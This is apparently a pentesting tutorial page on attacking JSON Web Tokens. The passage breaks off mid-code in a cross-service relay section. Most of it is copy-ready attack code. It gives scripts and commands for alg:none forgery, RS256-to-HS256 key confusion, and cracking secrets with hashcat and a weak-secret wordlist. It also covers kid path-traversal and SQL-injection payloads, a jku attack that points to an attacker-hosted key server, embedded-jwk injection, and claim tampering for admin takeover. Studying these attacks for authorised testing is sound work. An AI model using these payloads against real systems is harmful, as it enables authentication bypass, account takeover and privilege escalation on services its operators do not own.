---
title: JWT Manipulation & Attacks Basic
description: JSON Web Token internals, how JWT authentication works, every known attack technique with copy-ready payloads, real-world exploitation workflows, and step-by-step labs for pentesters.
navigation:
  icon: i-lucide-key-round
  title: JWT Attacks
---

## What Is JWT and Why Should Pentesters Care

::note
JWT (JSON Web Token) is the **dominant authentication mechanism** in modern web applications, APIs, and microservices. A single forged JWT can give you **admin access to an entire platform** without touching a database.
::

JWTs are everywhere:

- Single Page Applications (React, Vue, Angular)
- REST and GraphQL APIs
- Mobile app backends
- Microservice-to-microservice authentication
- OAuth 2.0 and OpenID Connect
- Single Sign-On (SSO) systems

Unlike session cookies where the server stores session data, JWTs are **self-contained** — all user information is embedded inside the token itself. The server trusts the token if the **signature is valid**. Break the signature mechanism, and you control identity.

::card-group
  ::card
  ---
  title: Authentication Bypass
  icon: i-lucide-shield-off
  ---
  Forge tokens to impersonate any user — admin, superadmin, internal service accounts.
  ::

  ::card
  ---
  title: Privilege Escalation
  icon: i-lucide-arrow-up-from-line
  ---
  Modify the `role`, `isAdmin`, or `scope` claim inside the token to escalate your privileges.
  ::

  ::card
  ---
  title: Account Takeover
  icon: i-lucide-user-x
  ---
  Manipulate the `sub` (subject) claim to access any user's account without their password.
  ::

  ::card
  ---
  title: Lateral Movement
  icon: i-lucide-move-horizontal
  ---
  In microservice architectures, a forged internal JWT can access every service behind the API gateway.
  ::
::

---

## JWT Structure — Anatomy of a Token

Every JWT has exactly **three parts** separated by dots:

```text [JWT Structure]
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzIwMDAwMDAwLCJleHAiOjE3MjAwODY0MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│                                          │                                                                                                          │
└──────── HEADER ──────────┘               └──────────────────────── PAYLOAD ──────────────────────────┘                                               └──── SIGNATURE ────┘
```

### Part 1 — Header

```json [Decoded Header]
{
  "alg": "HS256",
  "typ": "JWT"
}
```

| Field | Purpose | Pentester Interest |
| --- | --- | --- |
| `alg` | Signing algorithm | **Primary attack target** — change this to `none`, switch RS256→HS256 |
| `typ` | Token type | Usually `JWT` — rarely exploitable |
| `kid` | Key ID | SQL injection, path traversal, SSRF through this parameter |
| `jku` | JWK Set URL | SSRF — point to attacker-controlled key server |
| `jwk` | Embedded public key | Inject your own key and sign with it |
| `x5u` | X.509 certificate URL | SSRF — fetch attacker's certificate |
| `x5c` | Embedded X.509 cert | Inject your own certificate chain |

::warning
The header is **attacker-controlled input** that the server processes before verifying the signature. Every field in the header is a potential injection point.
::

### Part 2 — Payload (Claims)

```json [Decoded Payload]
{
  "sub": "1337",
  "username": "admin",
  "role": "user",
  "email": "user@target.com",
  "iat": 1720000000,
  "exp": 1720086400,
  "iss": "https://target.com",
  "aud": "https://api.target.com"
}
```

| Claim | Full Name | Purpose | Pentester Interest |
| --- | --- | --- | --- |
| `sub` | Subject | User identifier | Change to another user's ID → account takeover |
| `iat` | Issued At | When token was created | Usually not validated — set to future |
| `exp` | Expiration | When token expires | Remove or set far future → eternal access |
| `iss` | Issuer | Who created the token | Change to bypass issuer validation |
| `aud` | Audience | Intended recipient | Change to access different services |
| `role` | Custom | User's role | Change `user` → `admin` |
| `scope` | Custom | Permissions | Add `admin:write` scope |
| `isAdmin` | Custom | Admin flag | Change `false` → `true` |

::caution
The payload is **Base64URL encoded, NOT encrypted**. Anyone can decode and read it. Never assume JWT contents are secret.
::

### Part 3 — Signature

```text [Signature Creation]
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

The signature ensures the token **hasn't been tampered with**. If you can forge a valid signature, you can modify any claim in the payload.

### Decoding a JWT — Hands On

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Command Line"}
  ```bash [Terminal]
  # Decode each part (they're just Base64URL)
  TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

  # Decode Header
  echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | jq .

  # Decode Payload
  echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

  # The signature is binary — can't meaningfully decode
  echo "$TOKEN" | cut -d'.' -f3
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python"}
  ```python [decode_jwt.py]
  import base64, json, sys

  def decode_jwt(token):
      parts = token.split('.')
      for i, part in enumerate(parts[:2]):
          # Add padding
          padded = part + '=' * (4 - len(part) % 4)
          decoded = base64.urlsafe_b64decode(padded)
          label = "HEADER" if i == 0 else "PAYLOAD"
          print(f"\n{'='*50}")
          print(f"  {label}")
          print(f"{'='*50}")
          print(json.dumps(json.loads(decoded), indent=2))
      print(f"\n{'='*50}")
      print(f"  SIGNATURE")
      print(f"{'='*50}")
      print(parts[2])

  decode_jwt(sys.argv[1])
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool"}
  ```bash [Terminal]
  # Install jwt_tool
  git clone https://github.com/ticarpi/jwt_tool.git
  cd jwt_tool
  pip3 install -r requirements.txt

  # Decode and display
  python3 jwt_tool.py "$TOKEN"
  ```
  :::
::

---

## JWT Authentication Workflow

### How JWT Auth Works — Complete Flow

```text [JWT Authentication Flow]

  ┌──────────────┐                                    ┌───────────────┐
  │   Browser /   │                                    │    Server      │
  │   Client      │                                    │                │
  └──────┬───────┘                                    └──────┬────────┘
         │                                                    │
         │  ①  POST /api/auth/login                           │
         │      {"username":"admin","password":"pass123"}     │
         │ ──────────────────────────────────────────────────►│
         │                                                    │
         │                              ②  Validate credentials
         │                                  Query DB for user  │
         │                                  Compare bcrypt hash│
         │                                                    │
         │                              ③  Create JWT:        │
         │                                                    │
         │                    Header:  {"alg":"HS256"}        │
         │                    Payload: {"sub":"1337",         │
         │                              "role":"user",        │
         │                              "exp":1720086400}     │
         │                    Sign with SECRET_KEY             │
         │                                                    │
         │  ④  Response: {"token":"eyJhbGci..."}              │
         │ ◄──────────────────────────────────────────────────│
         │                                                    │
         │  ⑤  Client stores JWT                              │
         │      (localStorage, sessionStorage, or cookie)     │
         │                                                    │
         │  ⑥  GET /api/admin/dashboard                       │
         │      Authorization: Bearer eyJhbGci...             │
         │ ──────────────────────────────────────────────────►│
         │                                                    │
         │                     ⑦  Extract JWT from header     │
         │                     ⑧  Read "alg" from header      │
         │                     ⑨  Verify signature using:     │
         │                         - alg from header          │
         │                         - SECRET_KEY               │
         │                     ⑩  Decode payload claims       │
         │                     ⑪  Check exp > current time    │
         │                     ⑫  Check role == "admin"?      │
         │                         role is "user" → 403       │
         │                                                    │
         │  ⑬  HTTP 403 Forbidden                             │
         │      {"error":"Insufficient privileges"}           │
         │ ◄──────────────────────────────────────────────────│
         │                                                    │
```

::tip
Notice step ⑧ — the server reads the algorithm **from the token itself**. This is the root cause of algorithm confusion attacks. The server should **know** which algorithm to use, not trust the client.
::

### Where the Attacks Happen

```text [Attack Points on JWT Flow]

  ┌──────────────────────────────────────────────────────────┐
  │                    JWT PROCESSING                         │
  │                                                           │
  │  Token received                                          │
  │       │                                                   │
  │       ▼                                                   │
  │  ┌─────────────┐                                         │
  │  │ Parse Header │◄── ATTACK: Change alg to "none"        │
  │  │              │◄── ATTACK: Switch RS256 → HS256         │
  │  │              │◄── ATTACK: Inject kid, jku, jwk, x5u   │
  │  └──────┬──────┘                                         │
  │         │                                                 │
  │         ▼                                                 │
  │  ┌──────────────┐                                        │
  │  │Verify Signature│◄── ATTACK: Empty signature           │
  │  │               │◄── ATTACK: Brute-force weak secret    │
  │  │               │◄── ATTACK: Sign with public key (HS256)│
  │  └──────┬────────┘                                       │
  │         │                                                 │
  │         ▼                                                 │
  │  ┌──────────────┐                                        │
  │  │ Read Payload  │◄── ATTACK: Modify sub, role, isAdmin  │
  │  │   Claims      │◄── ATTACK: Remove exp claim           │
  │  │               │◄── ATTACK: Change iss, aud            │
  │  └──────┬────────┘                                       │
  │         │                                                 │
  │         ▼                                                 │
  │  ┌──────────────┐                                        │
  │  │ Authorization │◄── ATTACK: Escalate role/scope        │
  │  │   Check       │◄── ATTACK: Access other users (IDOR)  │
  │  └──────────────┘                                        │
  │                                                           │
  └──────────────────────────────────────────────────────────┘
```

---

## Attack 1 — None Algorithm Attack

### How It Works

The JWT specification defines `"alg":"none"` as a valid algorithm for **unsigned tokens**. If the server library accepts `none`, it **skips signature verification entirely**. You can modify any claim and the token is accepted.

```text [None Algorithm Attack Flow]

  Original Token:
  ┌──────────────────────────────────────────────────────────┐
  │ Header:  {"alg":"HS256","typ":"JWT"}                     │
  │ Payload: {"sub":"1337","role":"user","exp":1720086400}   │
  │ Signature: SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c │
  └──────────────────────────────────────────────────────────┘
                              │
                      Attacker modifies:
                              │
                              ▼
  Forged Token:
  ┌──────────────────────────────────────────────────────────┐
  │ Header:  {"alg":"none","typ":"JWT"}     ← Changed!       │
  │ Payload: {"sub":"1","role":"admin","exp":9999999999}      │
  │ Signature: (empty)                      ← Removed!       │
  └──────────────────────────────────────────────────────────┘
                              │
                    Server processes:
                              │
                              ▼
  ┌──────────────────────────────────────────────────────────┐
  │ 1. Read alg → "none"                                     │
  │ 2. alg is none → skip signature verification             │
  │ 3. Read payload → sub=1, role=admin                      │
  │ 4. Grant admin access ✓                                   │
  │                                                           │
  │ ⚠ FULL AUTHENTICATION BYPASS                              │
  └──────────────────────────────────────────────────────────┘
```

### Payloads

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool"}
  ```bash [Terminal]
  # Automatic None algorithm attack
  python3 jwt_tool.py "$TOKEN" -X a

  # Manual — specify claims to modify
  python3 jwt_tool.py "$TOKEN" -X a -T -pc role -pv admin
  python3 jwt_tool.py "$TOKEN" -X a -T -pc sub -pv 1
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python"}
  ```python [none_attack.py]
  import base64, json

  def b64url_encode(data):
      return base64.urlsafe_b64encode(
          json.dumps(data, separators=(',', ':')).encode()
      ).rstrip(b'=').decode()

  # Forge token with alg:none
  header = {"alg": "none", "typ": "JWT"}
  payload = {
      "sub": "1",
      "username": "admin",
      "role": "admin",
      "isAdmin": True,
      "exp": 9999999999
  }

  forged = f"{b64url_encode(header)}.{b64url_encode(payload)}."
  print(f"Forged Token: {forged}")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Manual (bash)"}
  ```bash [Terminal]
  # Encode header: {"alg":"none","typ":"JWT"}
  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

  # Encode payload: modify as needed
  PAYLOAD=$(echo -n '{"sub":"1","role":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

  # Construct token with empty signature
  FORGED="${HEADER}.${PAYLOAD}."

  echo "Forged: $FORGED"

  # Test it
  curl -H "Authorization: Bearer $FORGED" https://target.com/api/admin/dashboard
  ```
  :::
::

### Algorithm Variations to Try

Some servers filter `"none"` but miss variations:

```text [None Algorithm Variants]
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
"alg": "noNe"
"alg": "NonE"
```

::tip
Also try with and without trailing dot (empty signature). Some libraries behave differently:
- `header.payload.` (with trailing dot)
- `header.payload` (without trailing dot)
::

---

## Attack 2 — Algorithm Confusion (RS256 → HS256)

### How It Works

This is one of the **most powerful** JWT attacks. It exploits a fundamental confusion between asymmetric and symmetric algorithms.

```text [Algorithm Confusion Explained]

  NORMAL OPERATION (RS256 — Asymmetric):
  ┌──────────────────────────────────────────────────────────┐
  │                                                           │
  │  Signing:   Server signs with PRIVATE KEY (secret)       │
  │  Verifying: Server verifies with PUBLIC KEY (known)      │
  │                                                           │
  │  Private Key: Only the server has it                     │
  │  Public Key:  Often publicly available                    │
  │               (/jwks.json, /.well-known/jwks.json,       │
  │                certificate, source code)                  │
  │                                                           │
  └──────────────────────────────────────────────────────────┘

  THE ATTACK (Switch to HS256 — Symmetric):
  ┌──────────────────────────────────────────────────────────┐
  │                                                           │
  │  1. Attacker obtains the PUBLIC KEY                      │
  │  2. Attacker changes header: {"alg":"HS256"}             │
  │  3. Attacker signs token with PUBLIC KEY as HMAC secret  │
  │                                                           │
  │  Server verification logic:                               │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │ alg = token.header.alg  → "HS256"                  │  │
  │  │ key = getVerificationKey()  → returns PUBLIC KEY    │  │
  │  │ verify(token, key, alg)                             │  │
  │  │                                                      │  │
  │  │ For HS256: HMAC(token, PUBLIC_KEY) == signature?    │  │
  │  │ Attacker signed with PUBLIC_KEY → MATCH! ✓          │  │
  │  │                                                      │  │
  │  │ ⚠ SERVER ACCEPTS THE FORGED TOKEN                   │  │
  │  └────────────────────────────────────────────────────┘  │
  │                                                           │
  └──────────────────────────────────────────────────────────┘
```

### Step-by-Step Exploitation

::steps{level="4"}

#### Obtain the Public Key

```bash [Terminal]
# Common locations for public keys
curl -s https://target.com/.well-known/jwks.json | jq .
curl -s https://target.com/jwks.json | jq .
curl -s https://target.com/.well-known/openid-configuration | jq .jwks_uri
curl -s https://target.com/api/keys | jq .
curl -s https://target.com/oauth/discovery/keys | jq .

# Extract from TLS certificate
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem

# Extract from JWKS JSON to PEM
# If JWKS gives you n and e values:
python3 -c "
from jwt.algorithms import RSAAlgorithm
import json

jwks = '''$(curl -s https://target.com/.well-known/jwks.json)'''
key = json.loads(jwks)['keys'][0]
public_key = RSAAlgorithm.from_jwk(json.dumps(key))

from cryptography.hazmat.primitives import serialization
pem = public_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(pem.decode())
" > public.pem

cat public.pem
```

#### Forge Token Signed with Public Key as HMAC Secret

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool"}
  ```bash [Terminal]
  # Algorithm confusion attack
  python3 jwt_tool.py "$TOKEN" -X k -pk public.pem

  # With claim modification
  python3 jwt_tool.py "$TOKEN" -X k -pk public.pem -T -pc role -pv admin -pc sub -pv 1
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python"}
  ```python [algo_confusion.py]
  import jwt

  # Read the public key
  with open('public.pem', 'r') as f:
      public_key = f.read()

  # Forge token — sign HS256 with the public key
  payload = {
      "sub": "1",
      "username": "admin",
      "role": "admin",
      "exp": 9999999999
  }

  # PyJWT >= 2.4 blocks this by default
  # Use an older version or the algorithms parameter
  forged = jwt.encode(
      payload,
      public_key,
      algorithm="HS256"
  )

  print(f"Forged Token: {forged}")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Node.js"}
  ```javascript [algo_confusion.js]
  const jwt = require('jsonwebtoken');
  const fs = require('fs');

  const publicKey = fs.readFileSync('public.pem', 'utf8');

  const payload = {
    sub: "1",
    username: "admin",
    role: "admin",
    exp: 9999999999
  };

  // Sign with HS256 using the public key as secret
  const forged = jwt.sign(payload, publicKey, { algorithm: 'HS256' });
  console.log(`Forged Token: ${forged}`);
  ```
  :::
::

#### Test the Forged Token

```bash [Terminal]
FORGED="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Test against protected endpoint
curl -v -H "Authorization: Bearer $FORGED" https://target.com/api/admin/dashboard

# Test against user-specific endpoint
curl -v -H "Authorization: Bearer $FORGED" https://target.com/api/user/profile
```

::

::warning
Some libraries require the public key in specific formats for this attack to work. Try both PEM and DER formats, with and without newlines, and with `\n` replaced by actual newlines.
::

---

## Attack 3 — Weak Secret Key Brute Force

### How It Works

If the server uses HMAC (HS256/HS384/HS512) and the secret key is **weak or common**, you can brute-force it offline. Once you have the secret, you can forge any token.

```text [Secret Key Brute Force Flow]

  ┌──────────────────────────────────────────────────────────┐
  │                                                           │
  │  Captured Token: eyJhbGciOiJIUzI1NiJ9.eyJ...            │
  │                                                           │
  │  For each word in wordlist:                               │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │  Try "secret" as key:                               │  │
  │  │  HMAC-SHA256(header.payload, "secret") == sig?      │  │
  │  │  NO → next word                                     │  │
  │  │                                                      │  │
  │  │  Try "password" as key:                             │  │
  │  │  HMAC-SHA256(header.payload, "password") == sig?    │  │
  │  │  NO → next word                                     │  │
  │  │                                                      │  │
  │  │  Try "super_secret_key_123" as key:                 │  │
  │  │  HMAC-SHA256(header.payload, "super_sec...") == sig?│  │
  │  │  YES! ✓ SECRET FOUND                                │  │
  │  └────────────────────────────────────────────────────┘  │
  │                                                           │
  │  Now forge any token with the discovered secret!          │
  │                                                           │
  └──────────────────────────────────────────────────────────┘
```

### Payloads

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="hashcat (fastest)"}
  ```bash [Terminal]
  # hashcat mode 16500 = JWT
  # Save the full JWT to a file
  echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMzM3Iiwicm9sZSI6InVzZXIifQ.signature" > jwt.txt

  # Brute-force with wordlist
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force

  # With rules for mutations
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

  # Show cracked result
  hashcat -m 16500 jwt.txt --show
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool"}
  ```bash [Terminal]
  # jwt_tool built-in cracker
  python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt

  # With common JWT secrets list
  python3 jwt_tool.py "$TOKEN" -C -d jwt-secrets.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="john"}
  ```bash [Terminal]
  # John the Ripper
  echo "$TOKEN" > jwt.txt
  john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

  # Show result
  john jwt.txt --show
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python"}
  ```python [brute_jwt.py]
  import jwt, sys

  token = sys.argv[1]
  wordlist = sys.argv[2] if len(sys.argv) > 2 else "/usr/share/wordlists/rockyou.txt"

  with open(wordlist, 'r', errors='ignore') as f:
      for line in f:
          secret = line.strip()
          try:
              jwt.decode(token, secret, algorithms=["HS256","HS384","HS512"])
              print(f"\n[+] SECRET FOUND: {secret}")
              sys.exit(0)
          except jwt.InvalidSignatureError:
              continue
          except Exception:
              continue

  print("[-] Secret not found in wordlist")
  ```
  :::
::

### Common JWT Secrets

::collapsible{name="Common Weak JWT Secrets Wordlist"}

```text [jwt-common-secrets.txt]
secret
password
123456
changeme
test
key
jwt_secret
jwt-secret
token_secret
auth_secret
my_secret
super_secret
supersecret
s3cr3t
p@ssw0rd
admin
default
jwt
jsonwebtoken
node_secret
app_secret
application_secret
api_secret
hmac_secret
signing_key
private_key
mykey
mysecret
mysecretkey
your-256-bit-secret
your-384-bit-secret
your-512-bit-secret
secret_key
SECRET_KEY
secretkey
gsdgfhsdhghsdjhsfjhsjfhsd
aaaa
abcd1234
qwerty
keyboard
iloveyou
1234567890
abc123
111111
letmein
trustno1
master
welcome
monkey
dragon
login
princess
football
shadow
sunshine
```

::

### After Cracking — Forge Any Token

```bash [Terminal]
# Once you have the secret, forge anything
python3 -c "
import jwt

secret = 'super_secret_key_123'  # cracked secret

payload = {
    'sub': '1',
    'username': 'admin',
    'role': 'superadmin',
    'isAdmin': True,
    'exp': 9999999999
}

token = jwt.encode(payload, secret, algorithm='HS256')
print(f'Forged admin token: {token}')
"
```

---

## Attack 4 — Header Parameter Injection (kid, jku, jwk, x5u)

### kid (Key ID) Injection

The `kid` header tells the server **which key to use** for verification. If this value is used in a file path, database query, or command — it's injectable.

#### kid — Path Traversal

```text [kid Path Traversal Flow]

  Normal:
  ┌──────────────────────────────────────────────────────┐
  │ Header: {"alg":"HS256","kid":"key-001"}              │
  │                                                       │
  │ Server: key = readFile("/keys/" + kid)               │
  │         key = readFile("/keys/key-001")              │
  │         verify(token, key)                            │
  └──────────────────────────────────────────────────────┘

  Attack:
  ┌──────────────────────────────────────────────────────┐
  │ Header: {"alg":"HS256","kid":"../../dev/null"}       │
  │                                                       │
  │ Server: key = readFile("/keys/../../dev/null")       │
  │         key = "" (empty file)                         │
  │         verify(token, "", HS256) → sign with ""      │
  │                                                       │
  │ Attacker signs with empty string → MATCH! ✓           │
  └──────────────────────────────────────────────────────┘
```

```bash [Terminal]
# kid path traversal — sign with empty string
python3 jwt_tool.py "$TOKEN" -X i -hc kid -hv "../../dev/null" -pc role -pv admin -S hs256 -p ""

# Alternative paths
python3 jwt_tool.py "$TOKEN" -X i -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""
python3 jwt_tool.py "$TOKEN" -X i -hc kid -hv "/dev/null" -S hs256 -p ""
```

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Python Payload"}
  ```python [kid_traversal.py]
  import jwt

  # Sign with empty string (content of /dev/null)
  payload = {
      "sub": "1",
      "role": "admin",
      "exp": 9999999999
  }

  headers = {
      "alg": "HS256",
      "typ": "JWT",
      "kid": "../../../../../../dev/null"
  }

  token = jwt.encode(payload, "", algorithm="HS256", headers=headers)
  print(f"Forged: {token}")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Other Traversal Targets"}
  ```text [kid-traversal-payloads.txt]
  # Empty/predictable files
  ../../dev/null
  ../../../../../../dev/null
  /dev/null

  # Known static files with predictable content
  ../../../../../../etc/hostname
  ../../../../../../proc/sys/kernel/hostname

  # CSS/JS files with known content
  ../../../public/css/style.css

  # Windows
  ..\..\..\..\..\..\windows\win.ini
  ```
  :::
::

#### kid — SQL Injection

```text [kid SQL Injection Flow]

  Normal:
  ┌──────────────────────────────────────────────────────┐
  │ Header: {"alg":"HS256","kid":"key-001"}              │
  │                                                       │
  │ Server: SELECT key FROM keys WHERE kid = 'key-001'   │
  │         key = "actual_secret_key"                     │
  │         verify(token, key)                            │
  └──────────────────────────────────────────────────────┘

  Attack:
  ┌──────────────────────────────────────────────────────┐
  │ Header: {"alg":"HS256",                              │
  │          "kid":"' UNION SELECT 'attacker_key'--"}    │
  │                                                       │
  │ Server: SELECT key FROM keys                         │
  │         WHERE kid = '' UNION SELECT 'attacker_key'-- │
  │         key = "attacker_key"                          │
  │                                                       │
  │ Attacker signs with "attacker_key" → MATCH! ✓        │
  └──────────────────────────────────────────────────────┘
```

```bash [Terminal]
# kid SQL injection — control the key value
python3 jwt_tool.py "$TOKEN" -X i -hc kid -hv "' UNION SELECT 'ATTACKER_KEY'--" \
  -pc role -pv admin -S hs256 -p "ATTACKER_KEY"
```

```python [kid_sqli.py]
import jwt

payload = {
    "sub": "1",
    "role": "admin",
    "exp": 9999999999
}

# SQL injection to control the verification key
headers = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "' UNION SELECT 'ATTACKER_CONTROLLED_KEY'--"
}

# Sign with the same key we injected into the query result
token = jwt.encode(payload, "ATTACKER_CONTROLLED_KEY", algorithm="HS256", headers=headers)
print(f"Forged: {token}")
```

### jku (JWK Set URL) Injection

The `jku` header tells the server to **fetch signing keys from a URL**. Point it to your server.

```text [jku Attack Flow]

  ┌──────────────┐         ┌──────────────┐         ┌──────────────┐
  │   Attacker    │         │  Target App   │         │ Attacker's   │
  │   Browser     │         │   Server      │         │ Key Server   │
  └──────┬───────┘         └──────┬───────┘         └──────┬───────┘
         │                        │                         │
         │  ① Send JWT with       │                         │
         │  jku: https://         │                         │
         │  attacker.com/jwks     │                         │
         │ ──────────────────────►│                         │
         │                        │                         │
         │                        │  ② Fetch keys from jku  │
         │                        │ ────────────────────────►│
         │                        │                         │
         │                        │  ③ Returns attacker's   │
         │                        │     public key          │
         │                        │ ◄────────────────────────│
         │                        │                         │
         │                        │  ④ Verify signature     │
         │                        │     with attacker's key │
         │                        │     → VALID! ✓          │
         │                        │                         │
         │  ⑤ Admin access!       │                         │
         │ ◄──────────────────────│                         │
         │                        │                         │
```

::steps{level="4"}

#### Generate Attacker's Key Pair

```bash [Terminal]
# Generate RSA key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Convert public key to JWK format
python3 -c "
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm
import json

with open('attacker_public.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(f.read())

jwk = json.loads(RSAAlgorithm.to_jwk(public_key))
jwk['kid'] = 'attacker-key-1'
jwk['use'] = 'sig'

jwks = {'keys': [jwk]}
print(json.dumps(jwks, indent=2))
" > jwks.json
```

#### Host the JWKS on Your Server

```bash [Terminal]
# Simple Python HTTP server
python3 -m http.server 8888
# jwks.json will be available at http://ATTACKER_IP:8888/jwks.json

# Or use ngrok for HTTPS
ngrok http 8888
# Use the HTTPS URL in jku
```

#### Forge and Sign the Token

```python [jku_attack.py]
import jwt
from cryptography.hazmat.primitives import serialization

# Load attacker's private key
with open('attacker_private.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

payload = {
    "sub": "1",
    "username": "admin",
    "role": "admin",
    "exp": 9999999999
}

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "attacker-key-1",
    "jku": "https://ATTACKER_SERVER/jwks.json"
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(f"Forged: {token}")
```

#### Send the Forged Token

```bash [Terminal]
curl -H "Authorization: Bearer $FORGED" https://target.com/api/admin/dashboard
```

::

### jwk (Embedded Key) Injection

Instead of pointing to a URL, embed your **entire public key** directly in the JWT header.

```python [jwk_injection.py]
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from jwt.algorithms import RSAAlgorithm
import json

# Generate a new key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Convert public key to JWK
jwk = json.loads(RSAAlgorithm.to_jwk(public_key))

payload = {
    "sub": "1",
    "username": "admin",
    "role": "admin",
    "exp": 9999999999
}

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": jwk  # Embed our own public key!
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(f"Forged: {token}")
```

```bash [Terminal]
# jwt_tool — embedded JWK attack
python3 jwt_tool.py "$TOKEN" -X s -pc role -pv admin
```

---

## Attack 5 — Claim Tampering (After Signature Bypass)

Once you can forge valid signatures (via any attack above), modify these claims:

### Identity Manipulation

```json [Payload Modifications]
// Original
{"sub": "1337", "username": "regular_user", "role": "user"}

// Attack 1: Become admin user (change sub)
{"sub": "1", "username": "admin", "role": "user"}

// Attack 2: Escalate role
{"sub": "1337", "username": "regular_user", "role": "admin"}

// Attack 3: Both
{"sub": "1", "username": "admin", "role": "superadmin"}

// Attack 4: Add admin flag
{"sub": "1337", "username": "regular_user", "role": "user", "isAdmin": true}

// Attack 5: Expand scope
{"sub": "1337", "scope": "read write admin delete users:manage"}

// Attack 6: Change email (password reset abuse)
{"sub": "1337", "email": "attacker@evil.com"}

// Attack 7: Remove expiration (eternal token)
{"sub": "1337", "role": "admin"}  // no exp field

// Attack 8: Set far-future expiration
{"sub": "1337", "role": "admin", "exp": 9999999999}
```

### Common Claim Names to Modify

| Claim | Try These Values | Impact |
| --- | --- | --- |
| `sub` | `1`, `0`, `admin`, other user IDs | Account takeover |
| `role` | `admin`, `superadmin`, `root`, `administrator` | Privilege escalation |
| `isAdmin` | `true`, `1` | Privilege escalation |
| `is_admin` | `true`, `1` | Privilege escalation |
| `admin` | `true`, `1` | Privilege escalation |
| `scope` | `admin`, `read write admin`, `*` | Permission escalation |
| `groups` | `["admin","superuser"]` | Group-based access |
| `permissions` | `["admin:all","user:delete"]` | Permission escalation |
| `email` | `admin@target.com` | Account linking abuse |
| `iss` | Change to match expected issuer | Bypass issuer validation |
| `aud` | Change to target service name | Cross-service access |
| `exp` | `9999999999` or remove entirely | Eternal access |
| `iat` | Far past or future timestamp | Bypass time checks |
| `nbf` | `0` or past timestamp | Bypass "not before" check |

---

## Attack 6 — Cross-Service Relay Attacks

### How It Works

In microservice architectures, multiple services share the same JWT secret or trust the same signing key. A token issued for Service A can be used against Service B.

```text [Cross-Service Relay]

  ┌──────────────────────────────────────────────────────────┐
  │                    API GATEWAY                            │
  │                                                           │
  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐   │
  │  │ User API │  │Order API│  │Admin API│  │Payment  │   │
  │  │          │  │         │  │         │  │  API    │   │
  │  │ Audience:│  │Audience:│  │Audience:│  │Audience:│   │
  │  │ "users"  │  │"orders" │  │ "admin" │  │"payment"│   │
  │  └─────────┘  └─────────┘  └─────────┘  └─────────┘   │
  │                                                           │
  │  All share the SAME JWT secret: "company_jwt_secret"     │
  │                                                           │
  │  ⚠ Token from User API works on Admin API               │
  │  ⚠ If audience (aud) is not validated per service        │
  │                                                           │
  └──────────────────────────────────────────────────────────┘
```

### Exploitation

```bash [Terminal]
# Obtain token from low-privilege service
TOKEN=$(curl -s -X POST https://target.com/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}' | jq -r '.token')

# Use same token against admin service
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin/users

# If audience checking is absent, this works!

# If you can forge tokens (secret known), set aud claim:
python3 -c "
import jwt
token = jwt.encode({
    'sub': '1',
    'role': 'admin',
    'aud': 'admin-service',
    'exp': 9999999999
